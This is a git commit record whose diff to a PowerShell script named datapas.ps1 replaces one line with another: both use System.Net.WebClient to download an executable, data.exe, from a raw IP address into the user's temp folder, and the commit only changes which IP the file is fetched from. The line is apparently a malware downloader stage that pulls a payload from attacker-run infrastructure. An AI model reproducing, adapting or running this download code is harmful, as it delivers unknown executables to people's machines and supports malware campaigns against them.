2e096afcd000c889903c31285a1a5af8f76b88ee
userdol <48455401+userdol@users.noreply.github.com>
2019-03-28 02:39:51 +0300

    Update datapas.ps1

--- datapas.ps1
+++ datapas.ps1
@@ -1,1 +1,1 @@
-(New-Object System.Net.WebClient).DownloadFile("http://163.172.144.82/ex/data.exe","$env:temp\data.exe");
+(New-Object System.Net.WebClient).DownloadFile("http://23.106.160.239/data.exe","$env:temp\data.exe");
